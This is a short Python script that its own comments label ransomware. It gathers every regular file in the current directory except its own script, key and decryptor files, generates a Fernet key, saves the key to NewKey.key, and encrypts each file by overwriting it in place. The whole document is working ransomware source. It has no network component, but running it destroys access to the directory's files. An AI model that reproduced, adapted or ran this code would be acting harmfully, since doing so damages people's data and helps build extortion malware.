import os
from cryptography.fernet import Fernet

files = []

#Exclusion Path for the RansomWare
for file in os.listdir():
            if file == "Volt.py" or file == "NewKey.key" or file == "VoltDec.py":
                continue
            if os.path.isfile(file):
                files.append(file)
print(files)

#Writes Ransome Key
key = Fernet.generate_key()
with open("NewKey.key", "wb") as NewKey:
    NewKey.write(key)

#Encrypts The Files and Overwrites
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    conts_enc = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
            thefile.write(conts_enc)